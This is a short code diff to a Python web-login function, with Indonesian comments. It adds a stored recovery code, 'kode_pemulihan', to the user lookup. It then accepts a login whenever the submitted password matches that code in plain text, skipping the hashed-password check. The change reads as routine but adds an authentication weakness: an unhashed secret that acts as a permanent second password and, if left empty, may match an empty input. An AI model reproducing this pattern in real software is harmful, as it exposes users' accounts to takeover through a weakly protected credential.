@@ -57,7 +57,7 @@ def get_login_web(payload):
             # 🔎 Ambil data user dulu (tanpa join ke kelas)
             user = connection.execute(
                 text("""
-                    SELECT u.id_user, u.nama, u.email, u.password, u.role, u.status
+                    SELECT u.id_user, u.nama, u.email, u.password, u.kode_pemulihan, u.role, u.status
                     FROM users u
                     WHERE u.email = :email
                     AND u.status = 1
@@ -69,8 +69,9 @@ def get_login_web(payload):
             if not user or not user['password']:
                 return None
 
-            if not check_password_hash(user['password'], payload['password']):
-                return None
+            if user['kode_pemulihan'] != payload['password']:
+                if not check_password_hash(user['password'], payload['password']):
+                    return None
 
             id_paketkelas = None
             nama_kelas = None
